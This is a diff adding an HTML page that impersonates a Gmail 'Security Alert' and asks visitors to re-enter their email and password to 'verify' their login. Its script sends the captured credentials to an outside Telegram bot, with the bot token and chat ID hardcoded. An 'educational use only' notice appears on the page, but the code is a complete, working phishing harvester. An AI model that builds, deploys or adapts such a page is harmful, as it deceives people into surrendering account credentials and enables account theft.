@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gmail Security Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: "Roboto", sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      color: #d93025;
+    }
+    p {
+      margin: 15px 0;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 25px;
+      border: none;
+      border-radius: 5px;
+      font-size: 15px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1558c0;
+    }
+    form {
+      display: none;
+      margin-top: 15px;
+      text-align: left;
+    }
+    .notice {
+      font-size: 13px;
+      color: red;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" class="logo" alt="Gmail">
+    <h2>Security Alert</h2>
+    <p>We’ve detected suspicious activity. Please verify your login to continue.</p>
+    <button onclick="document.getElementById('loginForm').style.display='block';">Verify</button>
+
+    <form id="loginForm" onsubmit="sendToTelegram(); return false;">
+      <label>Email</label>
+      <input type="email" id="email" required>
+      <label>Password</label>
+      <input type="password" id="password" required>
+      <button type="submit">Submit</button>
+    </form>
+
+    <div class="notice">
+      ⚠️ Educational use only. Do not enter real credentials.
+    </div>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const chatId = "6811943916";
+      const botToken = "7964122827:AAGzduPcx5efgFUPrnG1FwICKlkC8E8Ezb8";
+      const message = `📧 Gmail Demo Login\nEmail: ${email}\nPassword: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        alert("submitted! ✅ (hh)");
+      })
+      .catch(error => {
+        alert("Something went wrong.");
+      });
+    }
+  </script>
+</body>
+</html>
